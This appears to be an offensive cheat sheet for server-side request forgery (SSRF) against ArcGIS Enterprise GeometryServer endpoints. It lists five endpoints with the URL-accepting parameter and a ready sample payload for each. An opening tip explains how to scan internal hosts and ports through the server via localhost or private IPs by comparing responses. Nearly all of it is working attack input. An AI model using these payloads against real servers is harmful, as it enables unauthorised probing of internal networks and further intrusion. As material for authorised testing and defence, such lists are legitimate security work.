Note: The paths may slightl vary from target to target so adjust them as needed. Each endpoint can be leveraged for internal network scan/internal port scan by using `http://127.0.0.1:25` or `http://localhost:25` or `http://<private_ip>`.

Quick tip for getting a partial SSRF: First attempt a port that is very likely to be closed such as 55555/tcp and then another one that is likely to be open 111/tcp(for linux) 445/tcp(for windows). After this observe differences in their responses to find a pattern.

## 1.
Endpoint: `/Utilities/Geometry/GeometryServer/areasAndLengths`

Parameter: `polygons`

Sample payload: `sr=102009&polygons={"url":"http://example.com"}&lengthUnit=9035&areaUnit=%7B%22areaUnit%22:%22esriAcres%22%7D&calculationType=preserveShape&f=json`

Documentation: https://developers.arcgis.com/rest/services-reference/enterprise/areas-and-lengths/

## 2. 
Endpoint: `/Utilities/Geometry/GeometryServer/buffer`

Parameter: `geometries`

Sample payload: `?geometries={"url":"http://example.com"}&inSR=4326&outSR=4326&bufferSR=3857&distances=1000&f=json`

Documentation: https://developers.arcgis.com/rest/services-reference/enterprise/buffer/

## 3. 
Endpoint: `/Utilities/Geometry/GeometryServer/lengths`

Parameter: `polylines`

Sample payload: `sr=4269&polylines={"url":"http://example.com"}&lengthUnit=9036&calculationType=preserveShape&f=json`

Documentation: https://developers.arcgis.com/rest/services-reference/enterprise/lengths/

## 4.

Endpoint: `Utilities/Geometry/GeometryServer/simplify`

Parameter: `geometries`

Sample payload: `sr=4326&geometries={"url":"http://example.com"}`

Documentation: https://developers.arcgis.com/rest/services-reference/enterprise/simplify/

## 5. 

Endpoint: `Utilities/Geometry/GeometryServer/relation`

Parameter: `geometries1` and `geometries2`

Sample Payload: `sr=4326&geometries1={"url":"http://example.com"}&geometries2={"url":"http://example.com"}&relation=esriGeometryRelationWithin`

Documentation: https://developers.arcgis.com/rest/services-reference/enterprise/relation/
